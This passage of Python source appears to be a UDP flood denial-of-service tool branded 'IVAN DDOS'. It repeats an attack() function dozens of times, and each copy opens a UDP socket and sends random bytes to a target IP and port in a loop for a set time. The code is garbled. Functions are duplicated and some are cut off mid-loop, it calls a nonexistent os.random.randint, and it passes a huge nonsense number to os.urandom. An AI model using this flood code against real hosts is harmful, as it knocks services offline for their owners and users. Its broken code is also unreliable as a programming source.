    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
